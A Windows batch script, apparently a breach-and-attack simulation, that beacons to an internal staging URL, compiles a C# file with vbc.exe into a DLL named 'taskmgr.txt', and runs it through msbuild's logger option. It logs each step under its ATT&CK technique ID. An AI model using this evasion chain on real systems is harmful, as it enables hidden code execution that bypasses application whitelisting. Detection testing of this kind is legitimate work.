@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8620\09ef2978
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8620-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=taskmgr.txt
SET njozco=file.txt
SET kkjwr=8620
SET qpwlpt=%APPDATA%\!ufeybybm!\macula-simulations.log
SET rtyucx=C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe
SET mkoiuj=msbuild.exe

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=>> "!qpwlpt!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_end=>> "!qpwlpt!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!qpwlpt!" 2>nul
cd /d "!recnn!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_end=>> "!qpwlpt!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!qpwlpt!" 2>nul
"!rtyucx!" /target:library /reference:Microsoft.Build.Framework.dll /out:"!hpnjatpj!" "!njozco!"
SET dsvbjk=0
SET fghnjm=
IF EXIST "!hpnjatpj!" (SET dsvbjk=1) ELSE (SET fghnjm=compile_failed)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_end=>> "!qpwlpt!" 2>nul
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!dsvbjk!:!fghnjm!>> "!qpwlpt!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: msbuild_start=!hpnjatpj!>> "!qpwlpt!" 2>nul
"!mkoiuj!" /logger:LoggerEntry,"!hpnjatpj!";MyParameters,Foo
SET xcvbnm=0
SET qwerty=
IF !ERRORLEVEL! EQU 0 (SET xcvbnm=1) ELSE (SET qwerty=msbuild_failed)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: msbuild_end=>> "!qpwlpt!" 2>nul
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!xcvbnm!:!qwerty!>> "!qpwlpt!" 2>nul
ENDLOCAL